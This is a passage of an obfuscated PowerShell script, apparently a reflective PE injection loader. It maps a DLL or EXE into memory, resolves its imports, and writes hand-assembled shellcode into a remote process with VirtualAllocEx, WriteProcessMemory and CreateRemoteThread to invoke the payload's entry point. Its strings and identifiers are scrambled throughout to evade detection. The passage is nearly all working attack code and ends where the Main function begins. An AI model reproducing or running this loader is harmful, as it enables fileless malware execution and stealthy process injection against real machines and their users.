			&("{1}{3}{0}{2}"-f 'rn','Write','ing','-Wa') (("{0}{2}{1}"-f 'PE fil','eing','e b')+' '+'ref'+'l'+'e'+'cti'+'vel'+("{1}{0}" -f 'lo','y ')+'a'+'d'+'e'+("{1}{0}" -f' is ','d')+'not'+("{0}{1}"-f' AS','LR')+("{2}{1}{0}{3}"-f 'ibl','t',' compa','e.')+' '+("{1}{0}{2}" -f'f the ','I','lo')+("{0}{1}" -f'adin','g')+' fa'+'il'+'s'+("{2}{0}{1}" -f' tr','y rest',',')+'ar'+'ti'+'n'+'g'+("{1}{0}{2}" -f'e',' Pow','rSh')+'el'+'l a'+'n'+'d'+' t'+("{1}{0}"-f 'ying','r')+("{0}{1}" -f' ag','ai')+'n') -WarningAction ('Con'+'tinue')
			[IntPtr]${LOad`Ad`DR} = ${ORi`G`iNaliM`AgebasE}
		}

		${pE`hANdLE} = [IntPtr]::"z`erO"				
		${eFfECTIv`Epe`hA`NDLe} = [IntPtr]::"z`ErO"		
		if (${r`e`mot`ELoadInG} -eq ${t`Rue})
		{
			
			${PEHA`N`DLe} = ${WIN32FUNC`Ti`ONS}."VIrtUAl`A`LLoC"."IN`VO`KE"([IntPtr]::"ZE`Ro", [UIntPtr]${Pe`iN`Fo}."sIz`EoFI`M`AGE", ${WI`N32cO`NstA`NtS}."mEM`_CoM`Mit" -bor ${WIN3`2`coNSTA`NTS}."M`eM_`ReserVe", ${W`i`N32COnS`Tants}."PA`g`e`_readwRitE")
			
			
			${Ef`FEcti`V`Epe`Ha`NdLe} = ${WIN`32f`Unc`TIOnS}."ViRT`U`Al`AL`LOcEX"."i`NV`oKe"(${rEMotEPRo`c`hAnD`lE}, ${lOADAD`DR}, [UIntPtr]${P`Ei`NFO}."Si`zeOfI`MAgE", ${wI`N32c`o`NStaN`Ts}."mEM_Co`m`mit" -bor ${Win`32CO`NsTAnTs}."m`EM_`ReSERve", ${WiN3`2conS`TANTs}."P`AgE_`ExE`cUTE_`ReaDW`RItE")
			if (${eFfe`CtI`V`epE`hA`NDle} -eq [IntPtr]::"ZE`RO")
			{
				Throw (('U'+'nab'+("{2}{1}{0}" -f'l','to a','le ')+'l'+("{0}{1}"-f 'oca','t')+'e'+' m'+'emo'+'r'+'y '+'i'+'n t'+'he '+("{0}{1}" -f're','mot')+'e p'+("{3}{0}{1}{2}"-f 'e','s','s. I','roc')+("{2}{0}{1}{4}{3}" -f'e PE',' b','f th','in','e')+'g'+("{0}{1}" -f' ','loa')+'ded doesn{'+'0}t sup'+("{0}{1}" -f'p','ort ')+("{2}{1}{0}" -f'R, ','L','AS')+'it '+'c'+("{0}{1}" -f'o','uld')+' b'+("{0}{1}" -f'e ','that')+' '+'the'+' re'+'qu'+'est'+'ed'+' b'+("{0}{1}{3}{2}" -f 'ase addr','e','f th','ss o')+("{1}{0}"-f's','e PE i')+' '+'al'+'r'+'e'+("{1}{0}" -f 'y ','ad')+("{0}{1}" -f 'in',' u')+'s'+'e')-f [char]39)
			}
		}
		else
		{
			if (${n`XcOM`Pa`TIBle} -eq ${TR`UE})
			{
				${P`E`hANDlE} = ${win32fUnCt`i`OnS}."Vi`RtUAlA`llOc"."I`NvOke"(${loA`D`A`DDr}, [UIntPtr]${pE`I`NFO}."sI`ZeOF`iM`Age", ${WI`N32CO`N`Stan`Ts}."M`eM_CO`Mm`iT" -bor ${WIN3`2`COnSTANTs}."M`em_r`E`SerVE", ${w`In3`2CONsT`AntS}."page_ReA`dwR`i`Te")
			}
			else
			{
				${PeHa`N`DLE} = ${WiN32F`UN`cT`I`ONS}."V`iRtU`ALalLOC"."In`VoKe"(${loA`daDdR}, [UIntPtr]${Pei`N`FO}."sI`zeofi`mA`ge", ${w`iN32c`oNstAN`Ts}."mEm_co`m`MiT" -bor ${WiN3`2`cOn`St`ANts}."MeM_R`Es`ERVE", ${wIN32C`onS`T`AnTS}."pA`ge_eXEcUt`E_ReA`dw`R`I`Te")
			}
			${Ef`FecTi`V`EPE`HAn`dLE} = ${PE`H`AndLe}
		}
		
		[IntPtr]${p`eEnDA`d`dr`EsS} = &("{4}{3}{1}{0}{2}" -f'gn','gnedIntAsUnsi','ed','dd-Si','A') (${p`e`ha`NdLE}) ([Int64]${p`e`iNFO}."Si`Z`EoFimagE")
		if (${Pe`Ha`NDLe} -eq [IntPtr]::"ZE`RO")
		{ 
			Throw (("{0}{1}" -f'V','irtua')+("{0}{1}" -f'lA','ll')+("{2}{0}{1}"-f'l','ed','oc fai')+' '+'to '+("{1}{0}" -f 'ca','allo')+("{0}{1}" -f't','e me')+'mo'+("{0}{1}"-f 'r','y for')+("{1}{0}{2}" -f'PE',' ','. If')+' PE'+' i'+'s n'+'ot '+("{2}{1}{0}{3}" -f'at','p','ASLR com','ib')+'l'+'e, '+'t'+'r'+("{1}{0}"-f 'running','y ')+' '+("{0}{1}" -f 'the ','s')+'cr'+("{1}{2}{0}"-f'n ','ipt ','i')+("{0}{1}"-f'a n','e')+'w '+'P'+("{0}{1}{2}"-f'o','wer','Shell')+' pr'+((("{2}{3}{0}{1}{4}"-f'(','the ne','oc','ess ','w ')))+'Pow'+'erS'+'hel'+'l'+' '+("{0}{1}"-f'pro','c')+'es'+'s'+' '+("{1}{0}" -f 'h','will ')+'a'+'v'+'e '+'a '+("{0}{1}{2}{3}"-f 'different',' ','m','emo')+'r'+'y l'+'ay'+'ou'+("{1}{0}"-f' s','t,')+'o'+' '+("{1}{0}" -f' a','the')+'d'+("{2}{0}{1}"-f 'ess th','e P','dr')+'E '+("{2}{3}{0}{4}{1}"-f'ght ','e','want','s mi','b')+("{1}{0}"-f 'free',' ')+')'+'.')
		}		
		[System.Runtime.InteropServices.Marshal]::('C'+'opy').Invoke(${P`ebYtEs}, 0, ${pEHAND`LE}, ${P`EIN`Fo}."SiZeOFhEA`d`e`Rs") | &("{1}{2}{0}"-f'l','Ou','t-Nul')
		
		
		
		&("{1}{0}{2}"-f '-Verbos','Write','e') ('Get'+("{2}{1}{0}" -f'g d','in','t')+("{0}{1}" -f'etai','l')+("{2}{1}{0}"-f'in',' PE ','ed')+("{1}{3}{0}{5}{4}{2}"-f'n fro','format','the head','io',' ','m')+'e'+'r'+'s'+' '+("{2}{0}{3}{1}{4}" -f'oade',' in me','l','d','mo')+'ry')
		${pE`i`NFo} = &("{4}{2}{1}{3}{0}"-f'ledInfo','e','et-PED','tai','G') -PEHandle ${Pe`h`AndLe} -Win32Types ${w`in32ty`pEs} -Win32Constants ${w`IN`3`2c`oNstAnts}
		${p`eIn`Fo} | &("{0}{1}{2}"-f 'A','dd-Mem','ber') -MemberType ('N'+'ote'+'Propert'+'y') -Name ('E'+'ndA'+'ddres'+'s') -Value ${P`EE`NdAddRESS}
		${PeI`NFo} | &("{1}{0}{3}{2}" -f'dd','A','er','-Memb') -MemberType ('N'+'o'+'tePro'+'perty') -Name ('Ef'+'fectivePEH'+'an'+'d'+'l'+'e') -Value ${EFFECTiv`e`PehaND`lE}
		&("{0}{1}{2}"-f'Write-Ver','bo','se') ('S'+("{0}{1}"-f'tar','t')+("{0}{1}{2}"-f'Add','re','ss: ')+("$PEHandle "+'')+' '+' '+' '+'E'+'nd'+'A'+("{1}{0}" -f 'ss: ','ddre')+"$PEEndAddress")
		
		
		
		&("{2}{0}{1}"-f'i','te-Verbose','Wr') ('Cop'+("{0}{1}{2}"-f 'y PE',' ','sec')+("{1}{0}{2}"-f 'on','ti','s i')+("{1}{0}" -f 'to','n ')+' me'+'m'+'o'+'ry')
		&("{1}{0}{3}{2}" -f 'py','Co','ions','-Sect') -PEBytes ${pEbY`T`eS} -PEInfo ${pe`i`NFO} -Win32Functions ${w`iN32`F`UnCTI`Ons} -Win32Types ${wI`N`32typEs}
		
		
		
		&("{0}{2}{1}"-f'Write','Verbose','-') ('Upd'+'ate'+' '+'mem'+("{1}{0}"-f'd','ory a')+'dre'+("{2}{0}{1}" -f'ses ba','sed ','s')+'on'+' w'+'her'+'e'+' t'+'h'+'e'+' P'+'E w'+("{1}{0}"-f ' ac','as')+("{1}{0}" -f'al','tu')+("{2}{1}{0}" -f' load','y','l')+("{0}{1}" -f 'ed in',' m')+'e'+'m'+'ory')
		&("{6}{1}{4}{2}{5}{3}{0}" -f'resses','date','mo','yAdd','-Me','r','Up') -PEInfo ${Pe`infO} -OriginalImageBase ${Ori`GI`NaLim`Ageb`ASe} -Win32Constants ${W`I`N32cO`NSTA`NtS} -Win32Types ${w`In`32TYpES}

		
		
		&("{0}{1}{2}" -f'Writ','e-Verbo','se') ((("{0}{1}" -f'Imp','o')+'rt DLL{0}s ne'+("{3}{0}{2}{4}{1}" -f' ','E we ar','t','eded by','he P')+'e'+' l'+("{1}{0}"-f 'adi','o')+'n'+'g')  -F  [CHar]39)
		if (${rEMO`T`e`loaDING} -eq ${t`RuE})
		{
			&("{3}{0}{4}{2}{1}{5}"-f 'D','t','Impor','Import-','ll','s') -PEInfo ${PeI`NFO} -Win32Functions ${WI`N32`Fu`NCTiONs} -Win32Types ${wIN32t`Yp`es} -Win32Constants ${wiN`3`2`cOnstaN`Ts} -RemoteProcHandle ${r`EmoTeProCHAN`d`lE}
		}
		else
		{
			&("{1}{2}{3}{0}" -f'lImports','Impor','t','-Dl') -PEInfo ${pE`iN`FO} -Win32Functions ${wI`N`32FUn`cTIOnS} -Win32Types ${w`IN3`2TyPEs} -Win32Constants ${wi`N3`2`coNSTANts}
		}
		
		
		
		if (${r`emo`T`ELOA`diNg} -eq ${fAl`sE})
		{
			if (${NxC`omP`ATiBle} -eq ${T`RUe})
			{
				&("{2}{3}{0}{1}" -f 'e-Ver','bose','Wri','t') (("{1}{2}{0}" -f 'e memo','Upda','t')+'ry'+' '+("{0}{3}{1}{2}" -f'pro','ectio','n ','t')+'fla'+'gs')
				&("{1}{7}{0}{5}{6}{3}{4}{2}"-f'm','U','onFlags','rotect','i','ory','P','pdate-Me') -PEInfo ${pE`in`Fo} -Win32Functions ${Wi`N32`FuNctiONs} -Win32Constants ${win`32`COnSt`A`NTS} -Win32Types ${WiN3`2`TYPeS}
			}
			else
			{
				&("{1}{2}{0}"-f 'rbose','Wr','ite-Ve') (("{1}{0}"-f 'E b','P')+("{2}{0}{1}"-f' ','re','eing')+'fl'+("{1}{0}" -f'cti','e')+'ve'+'ly'+' l'+("{0}{1}{2}" -f 'o','aded is',' no')+'t'+' c'+'o'+'m'+("{0}{1}" -f'pat','ibl')+'e'+("{0}{1}"-f ' wi','t')+("{3}{2}{0}{1}" -f' m','emory',' NX','h')+', '+("{2}{0}{1}"-f 'in','g ','keep')+("{2}{0}{1}" -f'or','y as rea','mem')+'d'+("{2}{1}{0}"-f 'e','e ex',' writ')+'c'+'u'+'te')
			}
		}
		else
		{
			&("{0}{2}{1}"-f 'W','-Verbose','rite') ('PE'+("{1}{0}"-f'being',' ')+' '+("{0}{5}{4}{3}{2}{1}"-f'loaded ','ces','mote pro','re','a ','in to ')+'s, '+'not'+("{2}{1}{0}" -f 't','jus',' ad')+'in'+'g m'+'e'+'mor'+'y '+'p'+'er'+'mis'+("{1}{0}" -f 'ns','sio'))
		}
		
		
		
		if (${re`mo`T`eL`OADing} -eq ${Tr`Ue})
		{
			[UInt32]${numbYT`EsWRitT`En} = 0
			${SU`cc`ESS} = ${wIn32`FU`N`CtIonS}."w`RITe`pRoceSs`Me`moRy"."In`VO`ke"(${REMO`T`EP`RoC`handLe}, ${e`FfecTIV`ePE`hAndLe}, ${pE`ha`NDLE}, [UIntPtr](${pein`FO}."sizeoF`I`mA`GE"), [Ref]${nU`mb`yTESwRitt`EN})
			if (${S`UCce`Ss} -eq ${fa`l`SE})
			{
				Throw (("{0}{1}"-f 'Una','bl')+'e t'+'o '+'wr'+("{2}{0}{3}{1}{4}"-f 'shel','od','ite ','lc','e ')+("{4}{3}{0}{1}{2}" -f'ro','c','ess','o remote p','t')+' me'+'mo'+'ry.')
			}
		}
		
		
		
		if (${p`EInFo}."fi`LEt`YpE" -ieq ('DL'+'L'))
		{
			if (${REm`oT`ELo`Ad`Ing} -eq ${fA`Lse})
			{
				&("{2}{0}{4}{3}{1}" -f'it','bose','Wr','er','e-V') (("{1}{0}"-f 'all','C')+'in'+'g'+' d'+'l'+("{2}{1}{0}"-f 't',' ','lmain so')+'he'+' '+("{0}{1}{2}" -f 'DLL know','s ','i')+'t h'+("{1}{2}{0}" -f'en','as',' be')+("{1}{0}" -f'd',' loa')+'e'+'d')
				${D`L`lmAInPtr} = &("{3}{5}{0}{7}{1}{6}{2}{4}"-f 'n','tA','n','Add-S','ed','ig','sUnsig','edIn') (${pE`In`FO}."PeH`ANdle") (${P`EIn`Fo}."I`magE_N`T_HEAD`ers"."OPTiOnAl`H`EAd`er"."AddRe`ss`OFeNtrYp`O`iNt")
				${DLlMaI`ND`elE`g`ATe} = &("{0}{3}{2}{1}{4}" -f 'Get-','e','el','D','gateType') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${dlL`MaIN} = [System.Runtime.InteropServices.Marshal]::('Ge'+'tD'+'el'+'egateForFunctionPoi'+'nt'+'er').Invoke(${dLlMa`in`PtR}, ${D`LlmAI`NDelEG`AtE})
				
				${D`LlMA`IN}."InV`oke"(${PeI`NfO}."PEHAn`dLe", 1, [IntPtr]::"Z`ero") | &("{1}{2}{0}" -f'l','O','ut-Nul')
			}
			else
			{
				${dl`L`m`AiNpTR} = &("{6}{2}{1}{5}{3}{4}{0}" -f 'ned','nedIntA','ig','s','ig','sUn','Add-S') (${e`F`Fec`TivEPehan`DLE}) (${PEi`NFo}."iMa`gE_nT_hEA`D`ERs"."O`PtIO`Nalhe`ADer"."A`DDREsSOfENtrY`poi`NT")
			
				if (${P`eiN`Fo}."pE`64b`iT" -eq ${tr`UE})
				{
					
					${CalL`Dll`mA`IN`SC1} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${cA`L`l`DllM`AinSC2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${c`AlldLLmA`i`NSc3} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					
					${C`AlL`DL`lmAInsc1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${Ca`llDl`LmA`In`SC2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${CALL`dLLm`AIn`SC3} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${S`c`leNG`TH} = ${caL`ld`L`Lmai`NSc1}."l`e`NgTh" + ${cal`lD`l`LmAinsC2}."l`e`Ngth" + ${Calld`LL`m`AIN`sC3}."l`E`NGTH" + (${pt`RSI`ze} * 2)
				${s`c`pSMem} = [System.Runtime.InteropServices.Marshal]::('Al'+'locH'+'Glob'+'al').Invoke(${sc`lEn`gtH})
				${scPsME`MOR`IGIn`Al} = ${scPs`mEm}
				
				&("{2}{4}{1}{3}{0}"-f'y','esToMemo','Write-By','r','t') -Bytes ${c`ALLDl`lm`AINsC1} -MemoryAddress ${S`CpsMeM}
				${SCp`s`meM} = &("{3}{2}{5}{6}{0}{4}{1}" -f'gnedIntAsU','gned','-','Add','nsi','S','i') ${scpSm`Em} (${c`AL`L`dlLmAInSc1}."l`eNGTh")
				[System.Runtime.InteropServices.Marshal]::('St'+'ruc'+'tureToPtr').Invoke(${EF`FeCT`IVepEH`ANDlE}, ${sc`pS`Mem}, ${f`AlSE})
				${ScPS`M`eM} = &("{2}{4}{1}{3}{0}" -f'ned','IntAsUns','Ad','ig','d-Signed') ${SCp`sm`em} (${P`TRs`izE})
				&("{4}{2}{0}{3}{1}"-f 'Byte','oMemory','te-','sT','Wri') -Bytes ${cA`LL`dL`LMA`INSC2} -MemoryAddress ${s`CpSMem}
				${sc`pSmeM} = &("{0}{1}{2}{4}{3}{5}"-f 'Add-','Signe','dIn','ign','tAsUns','ed') ${S`Cp`sMeM} (${cAlLdL`lm`Ai`NSc2}."l`engTH")
				[System.Runtime.InteropServices.Marshal]::('St'+'ructur'+'e'+'ToP'+'tr').Invoke(${dll`maiNP`TR}, ${s`cpS`mEM}, ${FAl`se})
				${sc`pSM`Em} = &("{7}{1}{3}{4}{0}{2}{6}{5}"-f 'edIntAs','i','Unsi','g','n','d','gne','Add-S') ${s`Cp`sMem} (${P`TrSI`ZE})
				&("{5}{4}{2}{3}{1}{0}" -f 'emory','M','-BytesT','o','te','Wri') -Bytes ${c`ALlD`lLM`A`INSc3} -MemoryAddress ${scPS`MeM}
				${ScpSm`em} = &("{2}{0}{6}{4}{5}{1}{3}" -f'd','gne','A','d','igne','dIntAsUnsi','d-S') ${scp`S`MEM} (${cA`LLD`ll`MaiNsC3}."le`N`GTH")
				
				${rs`CA`ddR} = ${W`iN32f`UnCTiO`NS}."V`iR`TuaLa`lloCEx"."I`NVOkE"(${ReMOte`p`Ro`C`Ha`Ndle}, [IntPtr]::"z`ERO", [UIntPtr][UInt64]${S`CLeNg`Th}, ${WIN32cO`N`s`TA`Nts}."mE`m_Com`mIt" -bor ${WIn`3`2COn`Sta`Nts}."m`em_RES`eRve", ${W`IN32CON`STaN`Ts}."PagE_EXecU`T`E_rE`AdWr`i`Te")
				if (${RSc`ADDr} -eq [IntPtr]::"ze`RO")
				{
					Throw ('Una'+'ble'+("{1}{2}{0}" -f 'ca',' to al','lo')+("{0}{1}{2}"-f 'te',' me','m')+'or'+'y '+'in'+' '+'the'+("{0}{1}"-f ' ','rem')+'o'+("{0}{1}"-f'te p','r')+'oce'+("{1}{2}{0}"-f'or ','ss',' f')+("{0}{1}"-f'shel','lc')+'od'+'e')
				}
				
				${SuC`CeSs} = ${wiN3`2F`U`NCtiO`NS}."w`RitE`pro`cESSMEMorY"."iNVo`KE"(${remOtEp`RO`chA`N`D`lE}, ${r`S`cAddr}, ${S`cpSMeM`OriGiN`Al}, [UIntPtr][UInt64]${SCl`EN`gTh}, [Ref]${NUMB`Y`T`eSwrIttEn})
				if ((${SUCC`ESs} -eq ${FAl`Se}) -or ([UInt64]${n`UMbYTesWr`I`TTeN} -ne [UInt64]${sc`l`eNgtH}))
				{
					Throw (("{1}{0}"-f 'able ','Un')+("{1}{0}" -f ' w','to')+'ri'+("{1}{2}{0}"-f'e','te ','sh')+'l'+("{0}{1}{2}" -f'lcode ','to r','e')+("{1}{0}"-f'e','mot')+' pr'+'oce'+'ss'+' me'+'mor'+'y.')
				}

				${r`T`hRea`DhanDLe} = &("{6}{5}{4}{2}{0}{7}{3}{1}"-f'T','ad','ote','e','eateRem','e-Cr','Invok','hr') -ProcessHandle ${RemotE`p`R`ochanD`lE} -StartAddress ${RS`CAD`dr} -Win32Functions ${WIN3`2fuNC`TI`O`Ns}
				${R`e`sulT} = ${Win32fUN`cTI`ons}."wAITfO`RSinGl`EObj`ect"."iNvo`KE"(${R`THRe`ADHAndLe}, 20000)
				if (${R`E`SulT} -ne 0)
				{
					Throw (("{0}{1}" -f'Ca','ll')+("{0}{1}"-f ' t','o ')+("{1}{0}"-f 'reateR','C')+'em'+'o'+'t'+("{1}{2}{0}"-f'ead ','eT','hr')+'to '+'ca'+'ll '+'Ge'+'tP'+("{1}{0}{2}" -f 'cA','ro','ddre')+("{1}{0}" -f 's fa','s')+("{1}{0}" -f'.','iled'))
				}
				
				${w`iN3`2f`UnC`TIONs}."vIrt`U`ALF`Ree`ex"."INvo`KE"(${reMOTEpr`oC`Han`DLE}, ${R`ScAddr}, [UIntPtr][UInt64]0, ${w`In32coNSta`NTs}."Mem_`REL`eAse") | &("{1}{0}"-f'Null','Out-')
			}
		}
		elseif (${pE`I`NfO}."fI`leT`Ype" -ieq ('E'+'XE'))
		{
			
			[IntPtr]${E`XE`Do`NEByTepTR} = [System.Runtime.InteropServices.Marshal]::('AllocH'+'Globa'+'l').Invoke(1)
			[System.Runtime.InteropServices.Marshal]::('WriteByt'+'e').Invoke(${ExeDo`Ne`B`yTe`pTR}, 0, 0x00)
			${Ov`ERWRItTE`Nm`eMInFO} = &("{0}{1}{2}{3}"-f 'Upd','ate-ExeFunc','tio','ns') -PEInfo ${pE`I`NFo} -Win32Functions ${WIn32fUn`cT`IoNS} -Win32Constants ${W`IN32coN`ST`AntS} -ExeArguments ${E`xe`ARgs} -ExeDoneBytePtr ${eXedONE`BYt`EPtr}

			
			
			[IntPtr]${ExEMAIn`p`Tr} = &("{1}{4}{2}{0}{6}{3}{5}"-f'Int','Add','ned','i','-Sig','gned','AsUns') (${p`eiNFo}."Pe`h`AnDLE") (${peIN`FO}."i`mAge_nT_HE`A`Ders"."O`Pt`IONaLHea`D`ER"."AD`d`Re`sSo`FEnT`RYPoiNT")
			&("{2}{1}{0}"-f'ose','Verb','Write-') ('Cal'+'l '+'EXE'+' '+("{0}{1}" -f 'M','ain')+' '+("{1}{0}" -f'ct','fun')+'io'+'n. '+("{0}{1}"-f'A','ddres')+'s'+': '+("$ExeMainPtr. "+'')+'C'+'r'+'e'+("{0}{2}{1}" -f'at','g ','in')+("{0}{1}"-f'th','re')+'ad '+'fo'+'r '+'t'+'he '+'EXE'+' '+'to'+' '+'ru'+'n '+'in'+'.')

			${W`in32`FUNC`TIO`Ns}."CR`E`AT`EthRead"."inV`OKe"([IntPtr]::"ZE`RO", [IntPtr]::"Ze`Ro", ${e`xe`maiNp`TR}, [IntPtr]::"Z`eRO", ([UInt32]0), [Ref]([UInt32]0)) | &("{1}{0}"-f 'l','Out-Nul')

			while(${Tr`UE})
			{
				[Byte]${T`h`Rea`ddoNe} = [System.Runtime.InteropServices.Marshal]::('ReadB'+'yt'+'e').Invoke(${ExeD`OneB`yT`EPTr}, 0)
				if (${t`H`REa`dDonE} -eq 1)
				{
					&("{5}{6}{0}{3}{4}{2}{1}"-f'-','s','esse','Arra','yOfMemAddr','Cop','y') -CopyInfo ${oVEr`wriTten`Mem`INFo} -Win32Functions ${Win32fU`NC`TIOns} -Win32Constants ${wIN`32Co`N`StaNTS}
					&("{1}{2}{3}{0}"-f 'ose','Writ','e-V','erb') (("{0}{1}"-f'EXE',' ')+("{1}{0}" -f'ad','thre')+' h'+("{0}{1}" -f'as ','c')+("{0}{2}{1}"-f 'omplet','.','ed'))
					break
				}
				else
				{
					&("{3}{2}{0}{1}"-f 'le','ep','S','Start-') -Seconds 1
				}
			}
		}
		
		return @(${p`e`inFo}."pe`HaN`DLe", ${eFFECTI`VEpe`han`dLe})
	}
	
	
	Function IN`VoK`e-`mEmoR`YFre`ElI`BrAry
	{
		Param(
		[Parameter(posItIOn=0, maNDatOrY=${t`Rue})]
		[IntPtr]
		${P`ehA`NDle}
		)
		
		
		${wIN`3`2cO`NSTants} = &("{2}{3}{4}{1}{5}{0}"-f'ts','onsta','Get-','Win3','2C','n')
		${W`In32`Fun`Ct`iOns} = &("{2}{3}{5}{1}{0}{4}" -f'ion','Funct','Ge','t-Wi','s','n32')
		${win32Ty`P`eS} = &("{2}{1}{3}{0}"-f'es','et','G','-Win32Typ')
		
		${pE`In`Fo} = &("{0}{1}{4}{3}{2}" -f 'Get-P','EDet','nfo','dI','aile') -PEHandle ${PeH`A`NdLE} -Win32Types ${W`I`N32tyP`ES} -Win32Constants ${wI`N`32c`ONst`AnTS}
		
		
		if (${PeI`N`FO}."IM`AG`e_`Nt_HEaDE`Rs"."opTIO`N`ALhEA`DEr"."ImP`oRt`Tab`Le"."Si`ZE" -gt 0)
		{
			[IntPtr]${iMP`OR`TDeS`crIPTorp`TR} = &("{4}{2}{1}{0}{6}{3}{5}"-f 'dInt','igne','-S','nsigne','Add','d','AsU') ([Int64]${PEI`NfO}."p`EHAn`DlE") ([Int64]${P`e`iNfo}."IMAGe`_nT_HE`A`DERs"."o`ptio`NA`LHeAd`eR"."I`MPorTt`ABLe"."viRTu`A`LaDDr`eSs")
			
			while (${tr`UE})
			{
				${impORT`DeS`Cr`i`pT`OR} = [System.Runtime.InteropServices.Marshal]::"pTRTOStR`UC`T`Ure"(${iMP`oRt`DEsCRipTORP`Tr}, [Type]${win3`2t`yP`es}."iMaG`e`_ImpOR`T_d`eScR`ipToR")
				
				
				if (${I`mpO`RtDESc`RI`PTOR}."cHAr`ACTErI`S`TIcS" -eq 0 `
						-and ${IM`p`ORT`d`Esc`RiPtOr}."fIrs`T`THUNk" -eq 0 `
						-and ${i`mP`OrtD`eSCr`i`PTOR}."fO`R`wA`RdErCHaIn" -eq 0 `
						-and ${Im`P`or`T`DEScrIpt`OR}."N`Ame" -eq 0 `
						-and ${im`pORtD`E`scRIPtOr}."TIme`DaTE`stamp" -eq 0)
				{
					&("{2}{3}{0}{1}" -f'Verbo','se','Writ','e-') ('D'+("{1}{0}" -f 'unlo','one ')+'adi'+("{0}{2}{1}{3}" -f 'ng the ','b','li','rar')+("{0}{1}" -f'ies ','ne')+'ede'+'d'+' '+("{1}{2}{0}"-f 'e PE','by ','th'))
					break
				}

				${ImP`ORTD`LlPatH} = [System.Runtime.InteropServices.Marshal]::"PtRTOST`RInGA`N`Si"((&("{0}{3}{1}{2}"-f'Add-SignedIntAs','s','igned','Un') ([Int64]${Pe`iNFo}."PehA`Ndle") ([Int64]${Imp`oR`TDescri`PT`OR}."N`AME")))
				${i`MpORTDllh`ANDlE} = ${Win32`FUNc`T`io`Ns}."gETmoDu`Leh`An`DLe"."INV`okE"(${i`Mportdl`Lp`Ath})

				if (${impo`RT`dlLHan`dlE} -eq ${N`Ull})
				{
					&("{0}{3}{2}{1}"-f'Wr','ing','arn','ite-W') (("{0}{1}"-f'Err','or')+' '+'get'+'ti'+'ng '+'D'+'LL '+'ha'+("{0}{1}" -f 'nd','le')+' '+'in'+' '+'Me'+'m'+'o'+("{2}{1}{0}"-f 'eLib','Fre','ry')+'r'+("{0}{1}" -f'ary,',' ')+("{1}{0}" -f'LLNa','D')+'m'+'e'+': '+("$ImportDllPath. "+'')+'Co'+("{1}{0}" -f 'in','nt')+'ui'+'ng '+'a'+'n'+("{0}{1}" -f 'ywa','ys')) -WarningAction ('Con'+'t'+'inue')
				}
				
				${s`UC`ceSS} = ${Wi`N32functi`O`Ns}."FReE`l`i`BraRY"."iNvo`KE"(${IM`P`ORTDL`L`haND`lE})
				if (${SuC`c`EsS} -eq ${fA`l`sE})
				{
					&("{0}{1}{3}{2}" -f 'Wr','ite-W','ning','ar') (("{0}{1}"-f 'Una','b')+'le'+' '+'t'+'o '+'fr'+'ee '+'lib'+("{0}{2}{1}"-f 'r',': ','ary')+("$ImportDllPath. "+'')+("{2}{0}{1}" -f 't','in','Con')+("{0}{1}"-f 'u','ing')+' '+("{1}{0}" -f'yw','an')+("{1}{0}" -f 's.','ay')) -WarningAction ('Cont'+'in'+'ue')
				}
				
				${iM`P`Ortde`s`CRIp`T`OrpTR} = &("{1}{5}{4}{0}{2}{3}" -f 'd','A','IntAsUnsigne','d','ne','dd-Sig') (${iMpo`RtDesCRiPt`O`RPTr}) ([System.Runtime.InteropServices.Marshal]::"S`Iz`eOf"([Type]${wiN32`TYp`Es}."IMaGE_`I`MpoRt_desCRIpt`Or"))
			}
		}
		
		
		&("{2}{1}{3}{0}"-f 'se','ite-Verb','Wr','o') (("{1}{0}" -f'alling','C')+' '+'dll'+("{1}{2}{0}" -f'the','m','ain so ')+' D'+'L'+'L k'+'n'+("{1}{0}"-f's i','ow')+'t'+("{1}{0}"-f' be',' is')+'i'+'ng '+("{1}{2}{0}"-f'd','unlo','a')+'e'+'d')
		${D`llM`Ain`PTR} = &("{3}{2}{0}{5}{1}{4}" -f'I','tAsUnsi','ned','Add-Sig','gned','n') (${PE`INFo}."P`eHaNdLE") (${PEi`N`Fo}."I`MAG`E_nt_`hEADe`Rs"."OPT`I`O`NAlhE`ADeR"."aDdr`e`SSOfe`NT`Rypoint")
		${DLlMaiN`De`lE`GATE} = &("{2}{0}{1}{3}"-f 'et-Del','ega','G','teType') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${dl`lmAIN} = [System.Runtime.InteropServices.Marshal]::('GetDelegateF'+'or'+'Funct'+'i'+'o'+'nPo'+'i'+'n'+'ter').Invoke(${DlL`mAinp`Tr}, ${dLLm`AI`N`deLega`TE})
		
		${dlL`m`AIn}."IN`VoKe"(${pe`iNFO}."p`E`HAndle", 0, [IntPtr]::"ZE`RO") | &("{2}{1}{0}"-f 'll','-Nu','Out')
		
		
		${s`U`CCEsS} = ${Wi`N32fuNCtI`oNs}."V`I`RTUaLFr`EE"."iNvo`kE"(${Pe`HA`NdLe}, [UInt64]0, ${W`I`N32CONst`AnTS}."Mem`_rELE`ASe")
		if (${S`UC`cesS} -eq ${FA`lsE})
		{
			&("{1}{0}{2}{3}" -f'rite-','W','Warn','ing') ((("{2}{0}{1}"-f 'ble t','o call ','Una')+'V'+("{1}{0}"-f 'a','irtu')+'lFr'+'e'+'e '+'on '+'the'+' '+'PE{0'+'}'+("{0}{1}"-f 's m','em')+'ory'+'.'+("{0}{1}"-f' C','on')+'t'+("{3}{0}{1}{2}" -f 'uing',' ','an','in')+'ywa'+'ys.') -F[CHar]39) -WarningAction ('Con'+'tin'+'ue')
		}
	}


	Function ma`iN
	{
		${Wi`N`32F`UN`CtiOns} = &("{3}{0}{2}{1}"-f 't-Win32','ions','Funct','Ge')
		${wI`N`32T`ypes} = &("{3}{2}{1}{0}{4}"-f 'e','32Typ','Win','Get-','s')
		${wiN32CO`Ns`TA`NtS} =  &("{0}{2}{3}{4}{1}{5}"-f'Get-Win','ant','32Co','ns','t','s')
		
		${re`m`OtE`p`R`ochANdle} = [IntPtr]::"zE`RO"
	
		
